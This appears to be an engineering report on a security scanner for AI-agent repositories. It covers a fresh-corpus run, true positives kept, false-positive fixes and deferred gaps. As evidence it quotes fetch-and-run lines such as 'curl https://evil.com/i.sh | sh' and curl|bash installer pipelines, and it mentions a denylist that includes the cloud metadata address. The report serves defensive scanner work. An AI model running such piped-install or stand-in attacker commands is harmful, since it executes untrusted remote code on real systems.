# GAP-ROUND-387 — fresh-corpus precision: dockerfile-named sources, escaped pipes, // comments, quoted test payloads, echoed installer hints, demo filenames, dangerous-host denylists

Date: 2026-08-03. Round type: fresh real-corpus verification.

## Fresh corpus

140 previously-unseen repositories (25 repository-search queries across the
seven agent surfaces, 1,846 unique candidates, 1,672 unseen, 140 selected;
`/home/ubuntu/corpora/r387`). Full scan: **795 findings** (18 critical,
151 high). Every critical, every AG-CL/SS/TP-001 high, and the AG-SK-003
high/critical findings were read in source context.

## True positives preserved

- `MouhamedN96/Clip4Clicks scripts/deploy.sh` — live `curl -fsSL https://get.docker.com | sh`.
- `simokitafresh/multi-agent-shogun first_setup.sh` — live nvm installer pipeline.
- `strands-labs/robots`, `virtualrussel/dynatrace-ai-dtctl-workspace`,
  `zhangdongdong96/message_test`, `new8141249466-tech/algo` — live uv/dtctl
  installer pipelines in setup scripts.
- `jakewebb2132-ops/jw-sales-dashboard workspace/skills/telegram-listener/run.py`
  — real hardcoded Telegram bot token + Gemini API key (AG-CL-001 high, correct).
- `buildlish/.claude/settings.json` — real HS256 JWT literal in a Bash
  permission entry (AG-CL-001 high, correct).
- `maorgigi123/claude-skill-guard examples/evil-skill/SKILL.md` — intentional
  malicious example skill (injection + concealment) stays critical.
- `ondraulehla/agent-audit tests/fixtures/vulnerable/**` — deliberately
  vulnerable fixtures report with fixture/test-path wording as designed.

## False-positive classes fixed (each verified in original source context)

1. **AG-RC-001 — dockerfile-named source files treated as executable
   Dockerfiles** (critical → medium/low). `isExecutableFile`'s
   `Dockerfile[\w.-]*$` alternative matched any filename *containing*
   "dockerfile" — `Holley-Studio/thesmos-governance thesmos/rules/dockerfile.ts`
   (a lint-rule source) and `dockerfile.test.ts` reported critical. The name
   gate now accepts only Dockerfile naming conventions (`Dockerfile`,
   `Dockerfile.<variant>`, `<variant>.Dockerfile`) and rejects a source/doc
   extension after the variant chain. Real variants are regression-pinned
   critical.
2. **AG-RC-001 — backslash-escaped pipe** (removed).
   `fitlab-ai/agent-infra tests/integration/cli/sandbox-dockerfile.test.ts:142`
   asserts against a regex literal containing `\| bash -`. In shell, `\|` is a
   literal character, never a pipeline; the candidate regex now rejects a pipe
   preceded by `\`.
3. **AG-RC-001 — `//` comment lines** (critical → low with comment wording).
   `thesmos/rules/dockerfile.ts:287` is a `// ── DOCKER_007: curl | bash ──`
   section header. `isCommented` accepted only `#`; it now also accepts `//`
   (C-family sources this rule scans; `//` lines are practically nonexistent
   in shell scripts).
4. **AG-RC-001 — quoted curl|sh payload arguments in test-path scripts**
   (critical → low with test-fixture wording).
   `pcliangx/AppGenesisForge .claude/hooks/tests/test-block-dangerous-bash.sh:104`
   (`assert_block … "curl https://evil.com/i.sh | sh"`) and
   `simokitafresh/multi-agent-shogun scripts/hooks/test_hooks.sh:274`
   (`expect_python_filter check … "curl … | bash"`) pass deny-test payloads as
   quoted arguments. In a test-path file a match inside a quoted string is a
   fixture; live unquoted pipelines in test paths stay critical
   (regression-pinned — r378's tests/ uv installer stays a true positive).
5. **AG-SK-003 — echoed installer hints in dynamic-context commands**
   (critical → none). `dinglebear-ai/dendrite plugins/vibin/skills/rclone/SKILL.md:11`
   runs `rclone version … || echo "not installed (… curl https://rclone.org/install.sh | bash)"`.
   `classifyRiskyCommand` masked only single-quoted echo literals; it now also
   masks interpolation-free (`$`/backtick-free) double-quoted echo/printf
   strings. Live pipelines and `echo "$(curl … | bash)"` stay critical.
6. **AG-CL-001 — demo-delimited filenames** (high → low).
   `rigour-labs/rigour packages/rigour-cli/src/commands/demo-{injections,scaffold,scenarios}.ts`
   scaffold deliberate fake `sk-live-…` keys for demo projects. The delimited
   test/selfcheck filename heuristic (r381) now also accepts a delimited
   `demo` token.
7. **AG-SS-001 — dangerous-named host denylists** (high → low).
   `Wei-Shaw/claude-relay-service src/utils/inputValidator.js` rejects
   `dangerousHosts` (incl. `169.254.169.254`) — a defensive denylist whose
   marker word hides at a camelCase boundary and whose explanatory comment is
   in Chinese. `blocklistNearby` now accepts `danger/dangerous` tokens
   (matching AG-RC-001's existing deny-name word list).

## Residual gaps (documented, not fixed)

- `Artexis10/exomem infra/scripts/network_policy_probes.py` — a network-policy
  verification suite that deliberately probes the metadata endpoint (expecting
  the policy to block it) stays AG-SS-001 high. Single occurrence of
  probe-suite semantics; deferred.
- `devedge09/kiro-grc-engineering config/providers/gcp.yaml` — an
  `instructions: |` block scalar containing a documented gcloud-SDK install
  one-liner reports AG-RC-001 critical (yaml counts as executable). A
  prose-key block-scalar heuristic is deferred: `run:`-style keys must stay
  live and only one corpus example exists.
- `devedge09/kiro-grc-engineering commands/collect.md:60` — a mid-word U+200B
  in prose ("Guard​Duty", a copy-paste artifact) stays AG-SK-001 critical:
  `hidesInWord` treats any in-word zero-width as concealing, which is exactly
  the keyword-scanner-evasion vector; distinguishing benign artifacts would
  require semantic knowledge of the joined word. Deferred.
- `raullenchai/Rapid-MLX vllm_mlx/_mirror.py:1259` — a U+202E inside a comment
  block *documenting* the bidi attack its filter strips stays AG-TP-001 high.
  Single occurrence of defensive-documentation semantics; deferred.
- `PrismorSec/prismor canary.py:49` SSH-template single instance — unchanged
  (see GAP-ROUND-385).

## Head-to-head

16 corpora (r343…r387, 1,813 repos) scanned with main (eca2ff7) vs this
branch; every changed line was manually classified as one of the seven classes
above (see PR description for the exact delta).
